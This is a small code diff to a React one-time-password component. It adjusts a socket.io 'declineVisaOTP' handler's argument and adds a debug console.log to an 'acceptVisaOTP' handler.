@@ -51,13 +51,14 @@ const OTP = ({ setMode, checkMode }) => {
     
   };
 
-  socket.on("declineVisaOTP", ({ID}) => {
+  socket.on("declineVisaOTP", (ID) => {
     if (ID === sessionStorage.getItem("id")) {
       setError(true);
       setLoading(false);
     }
   });
   socket.on("acceptVisaOTP", ({ id, userOtp }) => {
+    console.log(id)
     if (id === sessionStorage.getItem("id")) {
       setError(false);
       setLoading(false);
